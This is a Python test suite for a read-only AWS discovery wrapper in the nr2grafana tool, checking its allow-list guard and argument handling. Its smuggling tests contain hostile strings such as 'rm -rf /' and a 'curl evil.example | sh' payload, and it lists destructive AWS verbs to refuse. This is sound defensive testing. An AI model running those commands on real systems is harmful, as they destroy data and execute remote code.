"""Tests for nr2grafana.awscost -- the read-only AWS discovery layer.

The read-only guard is the most important thing under test: adversarial
mutating / non-allow-listed commands MUST be refused before any exec,
and no argument may smuggle a second command or a live shell
metacharacter (we run shell=False + argv).
"""

import json
import os
import stat
import subprocess
import tempfile
import textwrap
import unittest
from unittest import mock

from nr2grafana import awscost
from nr2grafana.awscost import (ALLOWED, AWSError, READONLY_EXCEPTIONS,
                                READONLY_VERBS, aws_available,
                                aws_vault_available, caller_identity,
                                cloudtrail_lookup, ec2_network_topology,
                                eks_describe, elbv2_describe, get_anomalies,
                                get_cost_and_usage, get_cost_forecast,
                                list_profiles, logs_insights_query, run_aws,
                                s3_bucket_sizes)


# A fake ``aws`` CLI: records the argv it was given and prints canned
# JSON depending on the (service, subcommand). Used via N2G_AWS_BIN so
# the real argv construction and JSON parsing are exercised end to end.
FAKE_AWS = textwrap.dedent('''\
    #!/usr/bin/env python3
    import json, os, sys
    argv = sys.argv[1:]
    log = os.environ.get("N2G_FAKE_LOG")
    if log:
        with open(log, "w") as fh:
            fh.write("\\0".join(argv))
    # Skip global options to find service + subcommand.
    pos = []
    i = 0
    skip_val = {"--output", "--region", "--profile"}
    while i < len(argv):
        a = argv[i]
        if a in skip_val:
            i += 2
            continue
        if a.startswith("--"):
            break
        pos.append(a)
        i += 1
    service = pos[0] if pos else ""
    sub = pos[1] if len(pos) > 1 else ""
    if (service, sub) == ("sts", "get-caller-identity"):
        print(json.dumps({"Account": "123456789012",
                          "Arn": "arn:aws:iam::123456789012:user/ro",
                          "UserId": "AIDAEXAMPLE"}))
    elif (service, sub) == ("ce", "get-cost-and-usage"):
        print(json.dumps({"ResultsByTime": [
            {"TimePeriod": {"Start": "2026-06-01", "End": "2026-07-01"},
             "Total": {"UnblendedCost": {"Amount": "100.0",
                                         "Unit": "USD"}}}]}))
    elif (service, sub) == ("ce", "get-cost-forecast"):
        print(json.dumps({"Total": {"Amount": "120.0", "Unit": "USD"}}))
    elif (service, sub) == ("ce", "get-anomalies"):
        print(json.dumps({"Anomalies": [{"AnomalyId": "a-1"}]}))
    elif (service, sub) == ("cloudwatch", "get-metric-statistics"):
        mn = ""
        if "--metric-name" in argv:
            mn = argv[argv.index("--metric-name") + 1]
        val = 42.0 if mn == "BucketSizeBytes" else 7.0
        print(json.dumps({"Datapoints": [
            {"Timestamp": "2026-08-01T00:00:00Z", "Average": val}]}))
    elif (service, sub) == ("cloudtrail", "lookup-events"):
        print(json.dumps({"Events": [
            {"EventName": "CreateFleet", "Username": "karpenter"}]}))
    elif (service, sub) == ("logs", "start-query"):
        print(json.dumps({"queryId": "q-abc123"}))
    elif (service, sub) == ("logs", "get-query-results"):
        print(json.dumps({"status": "Complete", "results": [
            [{"field": "dstPort", "value": "9095"},
             {"field": "gb", "value": "8235.0"}]],
            "statistics": {"recordsMatched": 10.0}}))
    elif (service, sub) == ("logs", "stop-query"):
        print(json.dumps({"success": True}))
    elif (service, sub) == ("eks", "list-clusters"):
        print(json.dumps({"clusters": ["obs-eks"]}))
    elif (service, sub) == ("eks", "describe-cluster"):
        print(json.dumps({"cluster": {"name": "obs-eks",
                                      "status": "ACTIVE"}}))
    elif (service, sub) == ("eks", "list-nodegroups"):
        print(json.dumps({"nodegroups": ["ng-1"]}))
    elif (service, sub) == ("eks", "describe-nodegroup"):
        print(json.dumps({"nodegroup": {"nodegroupName": "ng-1"}}))
    elif (service, sub) == ("ec2", "describe-network-interfaces"):
        print(json.dumps({"NetworkInterfaces": [
            {"NetworkInterfaceId": "eni-1",
             "PrivateIpAddresses": [{"PrivateIpAddress": "10.0.1.5"}]}]}))
    elif (service, sub) == ("ec2", "describe-subnets"):
        print(json.dumps({"Subnets": [
            {"SubnetId": "subnet-a", "AvailabilityZone": "us-east-1a"},
            {"SubnetId": "subnet-b", "AvailabilityZone": "us-east-1b"}]}))
    elif (service, sub) == ("ec2", "describe-route-tables"):
        print(json.dumps({"RouteTables": []}))
    elif (service, sub) == ("ec2", "describe-nat-gateways"):
        print(json.dumps({"NatGateways": []}))
    elif (service, sub) == ("ec2", "describe-availability-zones"):
        print(json.dumps({"AvailabilityZones": [
            {"ZoneName": "us-east-1a"}, {"ZoneName": "us-east-1b"},
            {"ZoneName": "us-east-1c"}]}))
    elif (service, sub) == ("elbv2", "describe-load-balancers"):
        print(json.dumps({"LoadBalancers": [
            {"LoadBalancerArn": "arn:lb/1", "Type": "network"}]}))
    elif (service, sub) == ("elbv2", "describe-target-groups"):
        print(json.dumps({"TargetGroups": [
            {"TargetGroupArn": "arn:tg/1"}]}))
    elif (service, sub) == ("elbv2", "describe-target-health"):
        print(json.dumps({"TargetHealthDescriptions": [
            {"Target": {"AvailabilityZone": "us-east-1a"},
             "TargetHealth": {"State": "healthy"}}]}))
    elif (service, sub) == ("elbv2", "describe-target-group-attributes"):
        print(json.dumps({"Attributes": [
            {"Key": "load_balancing.cross_zone.enabled",
             "Value": "true"}]}))
    elif (service, sub) == ("elbv2", "describe-listeners"):
        print(json.dumps({"Listeners": [{"Port": 443}]}))
    else:
        sys.stderr.write("fake aws: unhandled %s %s\\n" % (service, sub))
        sys.exit(254)
''')


def _completed(stdout=b"", stderr=b"", returncode=0):
    """Build a fake CompletedProcess-like object for subprocess.run."""
    obj = mock.Mock()
    obj.stdout = stdout
    obj.stderr = stderr
    obj.returncode = returncode
    return obj


class FakeAwsMixin(unittest.TestCase):
    """Installs a real fake ``aws`` script pointed to by N2G_AWS_BIN."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.path = os.path.join(self.tmp, "fake_aws.py")
        with open(self.path, "w") as fh:
            fh.write(FAKE_AWS)
        os.chmod(self.path, os.stat(self.path).st_mode | stat.S_IEXEC)
        self.log = os.path.join(self.tmp, "argv.log")
        self._env = mock.patch.dict(
            os.environ,
            {"N2G_AWS_BIN": self.path, "N2G_FAKE_LOG": self.log})
        self._env.start()

    def tearDown(self):
        self._env.stop()

    def recorded_argv(self):
        with open(self.log) as fh:
            return fh.read().split("\x00")


class GuardTests(unittest.TestCase):
    """Adversarial guard: mutating / non-allow-listed = refused."""

    MUTATING = [
        ("ce", "create-anomaly-monitor"),
        ("ce", "delete-anomaly-monitor"),
        ("ce", "update-anomaly-monitor"),
        ("ec2", "terminate-instances"),
        ("ec2", "run-instances"),
        ("ec2", "stop-instances"),
        ("s3api", "delete-bucket"),
        ("s3api", "put-object"),
        ("iam", "create-user"),
        ("iam", "delete-user"),
        ("organizations", "leave-organization"),
        ("sts", "assume-role"),
    ]

    def test_mutating_commands_refused_before_exec(self):
        for service, sub in self.MUTATING:
            with mock.patch("subprocess.run") as run:
                with self.assertRaises(AWSError) as ctx:
                    run_aws(service, sub)
                self.assertIn("refused", str(ctx.exception).lower())
                run.assert_not_called()

    def test_unknown_service_refused(self):
        with mock.patch("subprocess.run") as run:
            with self.assertRaises(AWSError):
                run_aws("lambda", "list-functions")
            run.assert_not_called()

    def test_subcommand_not_in_allow_list_refused(self):
        # A read-only-looking verb on an allow-listed service, but not in
        # the set, is still refused (exact membership, not prefix guess).
        # describe-vpcs reads, ec2 is allow-listed, yet it is not in the
        # ec2 set -> refused.
        with mock.patch("subprocess.run") as run:
            with self.assertRaises(AWSError):
                run_aws("ec2", "describe-vpcs")
            run.assert_not_called()

    def test_subcommand_smuggling_second_command_refused(self):
        # Trying to append a second command onto the subcommand string
        # fails exact allow-list membership -> refused before exec.
        with mock.patch("subprocess.run") as run:
            with self.assertRaises(AWSError):
                run_aws("ce", "get-cost-and-usage; rm -rf /")
            run.assert_not_called()

    def test_every_allowed_subcommand_is_readonly(self):
        # Structural invariant: nothing in the allow-list is a write verb.
        for service, subs in ALLOWED.items():
            for sub in subs:
                self.assertTrue(
                    sub.startswith(READONLY_VERBS),
                    "%s %s is not a read-only verb" % (service, sub))

    def test_case_variant_not_allowed(self):
        with mock.patch("subprocess.run") as run:
            with self.assertRaises(AWSError):
                run_aws("EC2", "Describe-Instances")
            run.assert_not_called()

    # --- 1.9 RCA discovery services: read-only verbs permitted ---

    RCA_READONLY = [
        ("cloudtrail", "lookup-events"),
        ("logs", "start-query"),
        ("logs", "get-query-results"),
        ("logs", "stop-query"),
        ("logs", "describe-log-groups"),
        ("logs", "describe-queries"),
        ("eks", "describe-cluster"),
        ("eks", "list-clusters"),
        ("eks", "list-nodegroups"),
        ("eks", "describe-nodegroup"),
        ("eks", "list-fargate-profiles"),
        ("ec2", "describe-network-interfaces"),
        ("ec2", "describe-subnets"),
        ("ec2", "describe-route-tables"),
        ("ec2", "describe-nat-gateways"),
        ("ec2", "describe-availability-zones"),
        ("ec2", "describe-volumes"),
        ("ec2", "describe-snapshots"),
        ("elbv2", "describe-load-balancers"),
        ("elbv2", "describe-target-groups"),
        ("elbv2", "describe-target-health"),
        ("elbv2", "describe-listeners"),
        ("elbv2", "describe-target-group-attributes"),
    ]

    def test_rca_readonly_commands_permitted(self):
        # Each new read-only command must pass the guard and reach exec.
        for service, sub in self.RCA_READONLY:
            def fake_run(argv, **kw):
                return _completed(stdout=b"{}")

            with mock.patch("subprocess.run", side_effect=fake_run):
                try:
                    run_aws(service, sub)
                except AWSError as e:  # pragma: no cover - defensive
                    self.fail("%s %s should be permitted: %s"
                              % (service, sub, e))

    # The ONLY non-prefix verbs allowed, and the exact exceptions set.
    def test_allowed_nonprefix_verbs_are_exactly_the_exceptions(self):
        # start-query / stop-query do NOT match any READONLY_VERBS prefix,
        # yet must be permitted -- via READONLY_EXCEPTIONS, nothing else.
        self.assertEqual(
            READONLY_EXCEPTIONS,
            frozenset([("logs", "start-query"), ("logs", "stop-query")]))
        for service, sub in READONLY_EXCEPTIONS:
            self.assertFalse(sub.startswith(READONLY_VERBS))
            self.assertTrue(awscost._is_allowed(service, sub))

    def test_no_other_nonprefix_verb_is_allowed(self):
        # Sweep every allow-listed subcommand: anything that does NOT start
        # with a read-only prefix must be one of the audited exceptions.
        for service, subs in ALLOWED.items():
            for sub in subs:
                if not sub.startswith(READONLY_VERBS):
                    self.assertIn(
                        (service, sub), READONLY_EXCEPTIONS,
                        "%s %s bypasses the prefix rule without being an "
                        "audited exception" % (service, sub))

    RCA_MUTATING = [
        ("cloudtrail", "delete-trail"),
        ("cloudtrail", "create-trail"),
        ("cloudtrail", "stop-logging"),
        ("logs", "put-log-events"),
        ("logs", "create-log-group"),
        ("logs", "delete-log-group"),
        ("logs", "put-retention-policy"),
        ("eks", "create-cluster"),
        ("eks", "delete-cluster"),
        ("eks", "update-nodegroup-config"),
        ("ec2", "run-instances"),
        ("ec2", "create-subnet"),
        ("ec2", "create-tags"),
        ("ec2", "delete-network-interface"),
        ("elbv2", "modify-target-group-attributes"),
        ("elbv2", "create-load-balancer"),
        ("elbv2", "delete-target-group"),
        ("elbv2", "register-targets"),
        ("elbv2", "deregister-targets"),
        ("elbv2", "set-subnets"),
        ("elbv2", "set-security-groups"),
        ("ec2", "terminate-instances"),
        ("ec2", "modify-network-interface-attribute"),
        ("eks", "update-cluster-config"),
        ("cloudtrail", "put-event-selectors"),
        # A "start-query"/"stop-query" exception is scoped to 'logs' ONLY;
        # the same non-prefix verb on another service must NOT be allowed.
        ("cloudtrail", "stop-query"),
        ("ec2", "start-query"),
    ]

    def test_rca_mutating_commands_refused_before_exec(self):
        for service, sub in self.RCA_MUTATING:
            with mock.patch("subprocess.run") as run:
                with self.assertRaises(AWSError) as ctx:
                    run_aws(service, sub)
                self.assertIn("refused", str(ctx.exception).lower())
                run.assert_not_called()

    def test_no_wildcard_service_or_subcommand(self):
        # A star / empty never slips through either gate.
        with mock.patch("subprocess.run") as run:
            for service, sub in [("*", "*"), ("logs", "*"), ("ec2", ""),
                                 ("", "describe-subnets"), ("logs", "")]:
                with self.assertRaises(AWSError):
                    run_aws(service, sub)
            run.assert_not_called()

    def test_exceptions_service_still_gated_for_other_verbs(self):
        # 'logs' is only reachable for its allow-listed/exception verbs; a
        # different non-prefix verb on the same service is refused.
        with mock.patch("subprocess.run") as run:
            with self.assertRaises(AWSError):
                run_aws("logs", "tail")
            with self.assertRaises(AWSError):
                run_aws("cloudtrail", "start-query")
            run.assert_not_called()


class ArgSmugglingTests(unittest.TestCase):
    """Args cannot smuggle a second command or a live metacharacter."""

    def test_shell_metacharacters_passed_literally_not_executed(self):
        # An allow-listed read command with a nasty arg: because we run
        # shell=False + argv, the metacharacters land as ONE literal argv
        # element and cannot spawn a second process.
        evil = "; rm -rf / && curl evil.example | sh"
        captured = {}

        def fake_run(argv, **kw):
            captured["argv"] = argv
            captured["shell"] = kw.get("shell")
            return _completed(stdout=b"{}")

        with mock.patch("subprocess.run", side_effect=fake_run):
            run_aws("ce", "get-dimension-values", [evil])
        self.assertFalse(captured["shell"])
        # The evil string survives as exactly one argv element, verbatim.
        self.assertIn(evil, captured["argv"])
        self.assertEqual(captured["argv"].count(evil), 1)

    def test_control_character_argument_refused(self):
        with mock.patch("subprocess.run") as run:
            with self.assertRaises(AWSError):
                run_aws("ce", "get-tags", ["a\nb"])
            run.assert_not_called()

    def test_nul_argument_refused(self):
        with mock.patch("subprocess.run") as run:
            with self.assertRaises(AWSError):
                run_aws("ce", "get-tags", ["a\x00b"])
            run.assert_not_called()

    def test_non_string_argument_refused(self):
        with mock.patch("subprocess.run") as run:
            with self.assertRaises(AWSError):
                run_aws("ce", "get-tags", [123])
            run.assert_not_called()

    def test_control_character_in_region_refused(self):
        with mock.patch("subprocess.run") as run:
            with self.assertRaises(AWSError):
                run_aws("sts", "get-caller-identity", region="us\n-1")
            run.assert_not_called()


class RunAwsExecTests(unittest.TestCase):
    """Argv construction, JSON parsing and error mapping."""

    def test_forces_output_json_and_shell_false(self):
        captured = {}

        def fake_run(argv, **kw):
            captured["argv"] = argv
            captured["shell"] = kw.get("shell")
            captured["stdin"] = kw.get("stdin")
            return _completed(stdout=b'{"ok": true}')

        with mock.patch("subprocess.run", side_effect=fake_run):
            out = run_aws("ce", "get-cost-and-usage",
                          ["--granularity", "MONTHLY"],
                          region="eu-west-1", profile="prod")
        self.assertEqual(out, {"ok": True})
        self.assertFalse(captured["shell"])
        self.assertEqual(captured["stdin"], subprocess.DEVNULL)
        argv = captured["argv"]
        self.assertIn("--output", argv)
        self.assertEqual(argv[argv.index("--output") + 1], "json")
        self.assertEqual(argv[argv.index("--region") + 1], "eu-west-1")
        self.assertEqual(argv[argv.index("--profile") + 1], "prod")
        # service/subcommand present and in order after global options.
        self.assertIn("ce", argv)
        self.assertIn("get-cost-and-usage", argv)
        self.assertLess(argv.index("ce"), argv.index("get-cost-and-usage"))

    def test_no_profile_flag_when_profile_blank(self):
        captured = {}

        def fake_run(argv, **kw):
            captured["argv"] = argv
            return _completed(stdout=b"{}")

        with mock.patch("subprocess.run", side_effect=fake_run):
            run_aws("sts", "get-caller-identity")
        self.assertNotIn("--profile", captured["argv"])

    def test_empty_stdout_returns_empty_dict(self):
        with mock.patch("subprocess.run",
                        return_value=_completed(stdout=b"   ")):
            self.assertEqual(run_aws("sts", "get-caller-identity"), {})

    def test_non_json_stdout_raises(self):
        with mock.patch("subprocess.run",
                        return_value=_completed(stdout=b"not json")):
            with self.assertRaises(AWSError) as ctx:
                run_aws("ce", "get-tags")
            self.assertIn("not JSON", str(ctx.exception))

    def test_missing_binary_actionable_error(self):
        with mock.patch.dict(os.environ, {"N2G_AWS_BIN": ""}):
            with mock.patch("nr2grafana.awscost._aws_bin",
                            return_value=None):
                with self.assertRaises(AWSError) as ctx:
                    run_aws("sts", "get-caller-identity")
        self.assertIn("aws", str(ctx.exception).lower())

    def test_not_configured_error_mapped(self):
        err = (b"Unable to locate credentials. You can configure "
               b"credentials by running \"aws configure\".")
        with mock.patch("subprocess.run",
                        return_value=_completed(stderr=err, returncode=255)):
            with self.assertRaises(AWSError) as ctx:
                run_aws("ce", "get-cost-and-usage")
        self.assertIn("not configured", str(ctx.exception).lower())

    def test_access_denied_error_mapped(self):
        err = (b"An error occurred (AccessDeniedException) when calling "
               b"the GetCostAndUsage operation: not authorized")
        with mock.patch("subprocess.run",
                        return_value=_completed(stderr=err, returncode=255)):
            with self.assertRaises(AWSError) as ctx:
                run_aws("ce", "get-cost-and-usage")
        self.assertIn("access denied", str(ctx.exception).lower())

    def test_throttling_error_mapped(self):
        err = (b"An error occurred (ThrottlingException): Rate exceeded")
        with mock.patch("subprocess.run",
                        return_value=_completed(stderr=err, returncode=255)):
            with self.assertRaises(AWSError) as ctx:
                run_aws("ce", "get-cost-and-usage")
        self.assertIn("throttl", str(ctx.exception).lower())

    def test_timeout_actionable_error(self):
        with mock.patch("subprocess.run",
                        side_effect=subprocess.TimeoutExpired("aws", 1)):
            with self.assertRaises(AWSError) as ctx:
                run_aws("ce", "get-cost-and-usage")
        self.assertIn("timed out", str(ctx.exception).lower())

    def test_file_not_found_at_exec_actionable(self):
        with mock.patch("nr2grafana.awscost._aws_bin",
                        return_value="/no/such/aws"):
            with mock.patch("subprocess.run",
                            side_effect=FileNotFoundError()):
                with self.assertRaises(AWSError):
                    run_aws("sts", "get-caller-identity")


class FakeAwsEndToEndTests(FakeAwsMixin):
    """Exercise the real binary path via N2G_AWS_BIN."""

    def test_aws_available_true_with_override(self):
        self.assertTrue(aws_available())

    def test_caller_identity_parsed(self):
        ident = caller_identity()
        self.assertEqual(ident["Account"], "123456789012")
        self.assertIn("iam", ident["Arn"])

    def test_get_cost_and_usage_parsed_and_argv(self):
        out = get_cost_and_usage(
            "2026-06-01", "2026-07-01", group_by="SERVICE",
            filt={"Dimensions": {"Key": "REGION",
                                 "Values": ["us-east-1"]}})
        self.assertIn("ResultsByTime", out)
        argv = self.recorded_argv()
        self.assertIn("--time-period", argv)
        self.assertIn("Start=2026-06-01,End=2026-07-01", argv)
        self.assertIn("Type=DIMENSION,Key=SERVICE", argv)
        self.assertIn("--filter", argv)
        self.assertIn("UnblendedCost", argv)

    def test_get_cost_forecast_parsed(self):
        out = get_cost_forecast("2026-09-01", "2026-12-01")
        self.assertEqual(out["Total"]["Amount"], "120.0")

    def test_get_anomalies_returns_list(self):
        anomalies = get_anomalies("2026-06-01", "2026-08-01")
        self.assertEqual(anomalies, [{"AnomalyId": "a-1"}])
        argv = self.recorded_argv()
        self.assertIn("--date-interval", argv)
        self.assertIn("StartDate=2026-06-01,EndDate=2026-08-01", argv)

    def test_s3_bucket_sizes_via_cloudwatch(self):
        sizes = s3_bucket_sizes(["mimir-blocks", "loki-chunks"])
        self.assertEqual(sizes["mimir-blocks"]["bytes"], 42.0)
        self.assertEqual(sizes["mimir-blocks"]["objects"], 7.0)
        self.assertIn("loki-chunks", sizes)

    def test_mutating_still_refused_with_real_binary(self):
        # Even with a working binary available, the guard refuses first.
        with self.assertRaises(AWSError):
            run_aws("ec2", "terminate-instances", ["--instance-ids", "i-1"])


class MiscTests(unittest.TestCase):
    def test_aws_available_false_when_nothing_found(self):
        with mock.patch("nr2grafana.awscost.shutil.which",
                        return_value=None):
            with mock.patch.dict(os.environ, {"N2G_AWS_BIN": ""}):
                self.assertFalse(aws_available())

    def test_s3_bucket_sizes_records_error_per_bucket(self):
        with mock.patch("nr2grafana.awscost.run_aws",
                        side_effect=AWSError("boom")):
            out = s3_bucket_sizes(["b1"])
        self.assertIn("error", out["b1"])
        self.assertIsNone(out["b1"]["bytes"])


class WrapPrefixTests(unittest.TestCase):
    """N2G_AWS_WRAP prepends a credential wrapper, still read-only."""

    def _capture(self, service="sts", sub="get-caller-identity",
                 profile=""):
        captured = {}

        def fake_run(argv, **kw):
            captured["argv"] = argv
            captured["shell"] = kw.get("shell")
            return _completed(stdout=b"{}")

        with mock.patch("nr2grafana.awscost._aws_bin", return_value="/x/aws"):
            with mock.patch("subprocess.run", side_effect=fake_run):
                run_aws(service, sub, profile=profile)
        return captured["argv"]

    def test_no_wrap_by_default(self):
        with mock.patch.dict(os.environ, {"N2G_AWS_WRAP": ""}):
            argv = self._capture(profile="prod")
        self.assertEqual(argv[0], "/x/aws")
        self.assertIn("--profile", argv)

    def test_aws_vault_shorthand_expands_with_profile(self):
        with mock.patch.dict(os.environ, {"N2G_AWS_WRAP": "aws-vault"}):
            argv = self._capture(profile="prod")
        self.assertEqual(argv[:4], ["aws-vault", "exec", "prod", "--"])
        self.assertEqual(argv[4], "/x/aws")
        # The wrapper owns creds -> no inner --profile.
        self.assertNotIn("--profile", argv)

    def test_full_command_prefix_with_profile_substitution(self):
        with mock.patch.dict(
                os.environ,
                {"N2G_AWS_WRAP": "aws-vault exec {profile} --"}):
            argv = self._capture(profile="staging")
        self.assertEqual(argv[:4], ["aws-vault", "exec", "staging", "--"])
        self.assertEqual(argv[4], "/x/aws")
        self.assertNotIn("--profile", argv)

    def test_wrap_still_read_only_guarded(self):
        # A wrapper does not loosen the guard: a mutating verb is still
        # refused before any exec, wrapper or not.
        with mock.patch.dict(os.environ, {"N2G_AWS_WRAP": "aws-vault"}):
            with mock.patch("subprocess.run") as run:
                with self.assertRaises(AWSError):
                    run_aws("ec2", "run-instances", profile="prod")
                run.assert_not_called()

    def test_wrap_token_control_char_refused(self):
        with mock.patch.dict(os.environ,
                             {"N2G_AWS_WRAP": "aws-vault exec {profile} --"}):
            with mock.patch("subprocess.run") as run:
                with self.assertRaises(AWSError):
                    run_aws("sts", "get-caller-identity",
                            profile="pro\nd")
                run.assert_not_called()

    def test_wrap_invalid_command_refused(self):
        # An unbalanced quote makes shlex.split raise -> actionable error.
        with mock.patch.dict(os.environ, {"N2G_AWS_WRAP": 'foo "unbalanced'}):
            with mock.patch("nr2grafana.awscost._aws_bin",
                            return_value="/x/aws"):
                with mock.patch("subprocess.run") as run:
                    with self.assertRaises(AWSError):
                        run_aws("sts", "get-caller-identity")
                    run.assert_not_called()

    def test_aws_vault_available_reflects_which(self):
        with mock.patch("nr2grafana.awscost.shutil.which",
                        return_value="/usr/bin/aws-vault"):
            self.assertTrue(aws_vault_available())
        with mock.patch("nr2grafana.awscost.shutil.which",
                        return_value=None):
            self.assertFalse(aws_vault_available())


class ListProfilesTests(unittest.TestCase):
    """list_profiles() parses AWS config/credentials section names only."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.config = os.path.join(self.tmp, "config")
        self.creds = os.path.join(self.tmp, "credentials")

    def _write(self, path, text):
        with open(path, "w") as fh:
            fh.write(textwrap.dedent(text))

    def test_parses_config_and_credentials(self):
        self._write(self.config, '''\
            [default]
            region = us-east-1
            [profile prod]
            sso_start_url = https://example.awsapps.com/start
            [profile dev]
            region = eu-west-1
            [sso-session my-sso]
            sso_region = us-east-1
            [services my-svc]
            s3 =
              max_concurrent_requests = 10
        ''')
        self._write(self.creds, '''\
            [default]
            aws_access_key_id = AKIANOTREAL
            [legacy]
            aws_access_key_id = AKIAALSOFAKE
        ''')
        with mock.patch.dict(os.environ,
                             {"AWS_CONFIG_FILE": self.config,
                              "AWS_SHARED_CREDENTIALS_FILE": self.creds}):
            profiles = list_profiles()
        self.assertEqual(profiles,
                         ["default", "dev", "legacy", "prod"])
        # sso-session / services headers are NOT profiles.
        self.assertNotIn("my-sso", profiles)
        self.assertNotIn("my-svc", profiles)

    def test_missing_files_return_empty(self):
        with mock.patch.dict(
                os.environ,
                {"AWS_CONFIG_FILE": os.path.join(self.tmp, "nope"),
                 "AWS_SHARED_CREDENTIALS_FILE": os.path.join(
                     self.tmp, "nope2")}):
            self.assertEqual(list_profiles(), [])

    def test_no_credential_values_read(self):
        # Sanity: even a file full of secrets yields only section names.
        self._write(self.creds, '''\
            [prod]
            aws_access_key_id = SUPERSECRET
            aws_secret_access_key = TOPSECRET
        ''')
        with mock.patch.dict(
                os.environ,
                {"AWS_CONFIG_FILE": os.path.join(self.tmp, "nope"),
                 "AWS_SHARED_CREDENTIALS_FILE": self.creds}):
            profiles = list_profiles()
        self.assertEqual(profiles, ["prod"])


class RcaHelperEndToEndTests(FakeAwsMixin):
    """The 1.9 discovery helpers against the real fake ``aws`` binary."""

    def test_cloudtrail_lookup(self):
        events = cloudtrail_lookup(
            attribute_key="EventName", attribute_value="CreateFleet",
            start="2026-08-30T00:00:00Z", end="2026-09-01T00:00:00Z",
            max_results=10)
        self.assertEqual(events[0]["EventName"], "CreateFleet")
        argv = self.recorded_argv()
        self.assertIn("--lookup-attributes", argv)
        self.assertIn("AttributeKey=EventName,AttributeValue=CreateFleet",
                      argv)
        self.assertIn("--start-time", argv)

    def test_logs_insights_query_start_poll_results(self):
        out = logs_insights_query(
            "<FLOW_LOG_GROUP>",
            "stats sum(bytes) by dstPort",
            1756598400, 1756684800, limit=20, poll_interval=0)
        self.assertEqual(out["status"], "Complete")
        self.assertEqual(out["query_id"], "q-abc123")
        self.assertEqual(out["polls"], 1)
        self.assertEqual(out["results"][0][0]["value"], "9095")
        argv = self.recorded_argv()  # last call = get-query-results
        self.assertIn("--query-id", argv)
        self.assertIn("q-abc123", argv)

    def test_logs_insights_query_accepts_multiple_groups(self):
        out = logs_insights_query(
            ["/vpc/flow-a", "/vpc/flow-b"], "fields @message",
            1756598400, 1756684800, poll_interval=0)
        self.assertEqual(out["status"], "Complete")

    def test_eks_describe_cluster_and_nodegroups(self):
        out = eks_describe("obs-eks")
        self.assertEqual(out["cluster"]["name"], "obs-eks")
        self.assertEqual(out["nodegroups"][0]["nodegroupName"], "ng-1")

    def test_eks_describe_lists_clusters_when_no_name(self):
        out = eks_describe()
        self.assertEqual(out["clusters"], ["obs-eks"])

    def test_ec2_network_topology(self):
        topo = ec2_network_topology()
        self.assertEqual(topo["network_interfaces"][0]["NetworkInterfaceId"],
                         "eni-1")
        azs = [s["AvailabilityZone"] for s in topo["subnets"]]
        self.assertEqual(azs, ["us-east-1a", "us-east-1b"])
        self.assertEqual(len(topo["availability_zones"]), 3)

    def test_ec2_network_topology_narrowed_by_ids(self):
        ec2_network_topology(interface_ids=["eni-1"],
                             subnet_ids=["subnet-a"])
        argv = self.recorded_argv()  # last call = describe-availability-zones
        # The narrowing flags reached the relevant describe calls; the
        # availability-zones call (last) carries neither filter.
        self.assertNotIn("--network-interface-ids", argv)

    def test_elbv2_describe_health_and_attributes(self):
        out = elbv2_describe()
        self.assertEqual(out["load_balancers"][0]["Type"], "network")
        th = out["target_health"]["arn:tg/1"]
        self.assertEqual(th[0]["TargetHealth"]["State"], "healthy")
        attrs = out["attributes"]["arn:tg/1"]
        self.assertEqual(attrs[0]["Key"],
                         "load_balancing.cross_zone.enabled")
        self.assertIn("arn:lb/1", out["listeners"])


class RcaHelperErrorTests(unittest.TestCase):
    """Helpers surface actionable AWSError, never tracebacks."""

    def test_logs_insights_start_query_no_id(self):
        def fake_run(service, sub, *a, **k):
            if sub == "start-query":
                return {}
            return {}

        with mock.patch("nr2grafana.awscost.run_aws", side_effect=fake_run):
            with self.assertRaises(AWSError) as ctx:
                logs_insights_query("lg", "q", 0, 1, poll_interval=0)
        self.assertIn("queryid", str(ctx.exception).lower())

    def test_logs_insights_failed_status(self):
        def fake_run(service, sub, *a, **k):
            if sub == "start-query":
                return {"queryId": "q1"}
            return {"status": "Failed"}

        with mock.patch("nr2grafana.awscost.run_aws", side_effect=fake_run):
            with self.assertRaises(AWSError) as ctx:
                logs_insights_query("lg", "q", 0, 1, poll_interval=0)
        self.assertIn("failed", str(ctx.exception).lower())

    def test_logs_insights_poll_budget_exhausted_stops_query(self):
        calls = []

        def fake_run(service, sub, *a, **k):
            calls.append(sub)
            if sub == "start-query":
                return {"queryId": "q1"}
            if sub == "get-query-results":
                return {"status": "Running"}
            return {}

        with mock.patch("nr2grafana.awscost.run_aws", side_effect=fake_run):
            with mock.patch("nr2grafana.awscost.time.sleep"):
                with self.assertRaises(AWSError) as ctx:
                    logs_insights_query("lg", "q", 0, 1,
                                        max_polls=3, poll_interval=0)
        self.assertIn("did not complete", str(ctx.exception).lower())
        # It attempted to cancel the runaway query.
        self.assertIn("stop-query", calls)

    def test_cloudtrail_lookup_non_dict_returns_empty(self):
        with mock.patch("nr2grafana.awscost.run_aws", return_value=[]):
            self.assertEqual(cloudtrail_lookup(), [])


if __name__ == "__main__":
    unittest.main()
